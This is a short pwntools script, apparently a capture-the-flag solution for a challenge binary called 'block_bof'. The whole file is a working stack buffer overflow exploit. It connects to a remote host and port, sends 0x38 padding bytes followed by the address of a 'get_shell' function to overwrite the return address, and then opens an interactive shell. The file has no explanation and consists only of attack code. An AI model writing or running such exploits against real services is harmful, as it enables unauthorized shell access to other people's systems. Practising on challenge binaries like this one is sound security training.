from pwn import *

#p = process('./block_bof')
p = remote(ADDRESS, PORT)

get_shell = 0x401278
payload = b'\x00' * 0x38
payload += p64(get_shell)

p.sendlineafter(b'what is your name??\n', b"AAAA")
p.sendlineafter(": ", payload)
p.interactive()
